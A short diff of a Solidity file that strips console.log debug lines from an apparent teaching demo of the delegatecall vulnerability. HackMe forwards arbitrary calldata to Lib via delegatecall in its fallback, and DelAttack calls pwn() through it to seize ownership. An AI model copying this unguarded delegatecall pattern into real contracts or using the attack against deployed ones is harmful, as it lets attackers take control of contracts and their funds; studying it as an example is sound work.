@@ -9,7 +9,6 @@ contract Lib {
     }
 
     function pwn() public payable {
-        console.log("whynot ");
         owner = msg.sender;
     }
 }
@@ -28,12 +27,7 @@ contract HackMe {
     }
 
     fallback() external payable {
-        console.log("here");
-        console.log(owner);
         (bool sent, ) = payable(address(lib)).delegatecall(msg.data);
-       
-        //(bool sent2, ) = payable(address(lib)).delegatecall(abi.encodeWithSignature("pwn()"));
-        console.log(owner);
     }
 }
 
@@ -47,6 +41,5 @@ contract DelAttack {
 
     function attack() public {
          (bool sent, ) = hackMe.call(abi.encodeWithSignature("pwn()"));
-         console.log(sent);
     }
 }
